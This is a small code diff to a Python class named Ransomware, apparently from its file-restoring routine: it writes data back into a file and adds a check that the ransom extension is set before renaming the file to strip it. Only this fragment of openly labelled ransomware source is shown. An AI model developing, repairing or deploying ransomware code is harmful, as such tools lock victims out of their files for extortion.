@@ -99,8 +99,9 @@ class Ransomware:
                 f.seek(0)
                 f.write(data)
                 f.truncate()
-            ext_len = len(self.ext)+1
-            os.rename(file_path,file_path[:-ext_len])
+            if self.ext is not None:
+                ext_len = len(self.ext)+1
+                os.rename(file_path,file_path[:-ext_len])
 
 
 if __name__ == '__main__':
